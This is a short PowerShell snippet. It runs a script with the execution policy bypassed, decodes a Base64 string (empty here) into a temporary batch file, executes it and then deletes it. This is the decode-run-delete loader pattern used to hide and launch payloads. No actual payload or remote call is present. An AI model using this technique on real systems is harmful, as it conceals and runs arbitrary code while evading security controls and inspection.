powershell.exe -ExecutionPolicy Bypass -File "C:\Users\Bruno\Desktop\Testo1.bat" 
$Base64 = "" 
$DecodedBytes = [System.Convert]::FromBase64String($Base64) 
$DecodedString = [System.Text.Encoding]::UTF8.GetString($DecodedBytes) 
$TempFile = [System.IO.Path]::GetTempFileName() + ".bat" 
[System.IO.File]::WriteAllText($TempFile, $DecodedString) 
cmd /c $TempFile 
Remove-Item $TempFile 
